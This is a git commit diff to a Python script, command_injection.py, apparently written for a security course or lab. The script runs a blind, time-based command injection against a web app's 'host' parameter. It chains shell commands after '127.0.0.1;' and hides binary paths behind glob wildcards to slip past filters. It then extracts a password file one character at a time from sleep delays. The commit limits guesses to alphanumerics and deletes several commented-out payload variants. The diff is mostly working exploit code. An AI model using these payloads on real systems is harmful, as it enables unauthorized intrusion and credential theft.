5a369485525afeb42ed826a8faa54ddd55e0ce1b
castroaj <castroaj@dukes.jmu.edu>
2022-11-06 17:10:49 -0500

    added alphanumeric constraint

--- command_injection.py
+++ command_injection.py
@@ -3,7 +3,6 @@ from time import sleep
 import requests
 import argparse
 from os import sys
-from typing import Dict
 from urllib3.util import SKIP_HEADER
 from urllib.parse import quote
 from collections import OrderedDict
@@ -72,29 +71,31 @@ def determine_password_request(url:str,
                                sleep:int,
                                operator:str):    
     #COMMAND '/u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [ $v = "'+chr(char_code)+'" ] && /u?r/b?n/sl??p '+str(sleep)+'; }'
-    url = deepcopy(url) + '?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Ft%3Fil+-c+%2B'+str(len)+'+%2Fetc%2Fpassword.txt+|+%2Fu%3Fr%2Fb%3Fn%2Fh%3Fad+-c+1+|+{+read+v%3B+[+%24v+%3D+"'+quote(chr(char_code), safe='')+'"+]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+'+str(sleep)+'%3B+}'
+    full_url = deepcopy(url) + '?host=127.0.0.1%3B+%2Fu%3Fr%2Fb%3Fn%2Ft%3Fil+-c+%2B'+str(len)+'+%2Fetc%2Fpassword.txt+|+%2Fu%3Fr%2Fb%3Fn%2Fh%3Fad+-c+1+|+{+read+v%3B+[+%24v+%3D+"'+quote(chr(char_code))+'"+]+%26%26+%2Fu%3Fr%2Fb%3Fn%2Fsl%3F%3Fp+'+str(sleep)+'%3B+}'
     print(f"Attempting to see if ascii-code={char_code} ({chr(char_code)}) is '{operator}' than the unknown character at position {len}")
-    return make_get_request(url, timeout)
+    return make_get_request(full_url, timeout)
 
 
 def linear_search_determine_password(url:str, password_len:int, timeout=10):
     sleep:int = timeout + 1
     password:str = ""
+    
+    alpha_numeric_ranges = [(48,58), (65,91), (97, 123)]
+    
     for len in range(1, password_len):
-
         found_for_len = False
-
-        for char_code in range(48, 126):
-            if determine_password_request(url, timeout, len, char_code, sleep, "="):
-                print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
-                password += chr(char_code)
-                found_for_len = True
-                print("PASSWORD: " + password)
+        for range_tuple in alpha_numeric_ranges:
+            for char_code in range(range_tuple[0], range_tuple[1]):
+                if determine_password_request(url, timeout, len, char_code, sleep, "="):
+                    print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
+                    password += chr(char_code)
+                    found_for_len = True
+                    print("PASSWORD: " + password)
+                    break
+            if found_for_len:
                 break
-
         if found_for_len == False:
             return "NOT FOUND"
-
     return password
 
 url:str = parse_args()
@@ -102,10 +103,3 @@ timeout = 5
 password = linear_search_determine_password(url, determine_password_length(url, timeout), timeout)
 
 print(f"PASSWORD FOUND: {password}")
-
-# 127.0.0.1; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "@" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
-# 192.168.1.153; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "a" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
-# 127.0.0.1; [ 1 -eq 2 ] && /u?r/b?n/sl??p 5 || /u?r/b?n/?s;
-# head -c 1 pass.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/sl??p 5 || /u?r/b?n/ls; }
-# /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/sl??p 5 || /u?r/b?n/?s; }
-# /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/?s || /u?r/b?n/sl??p 5; }
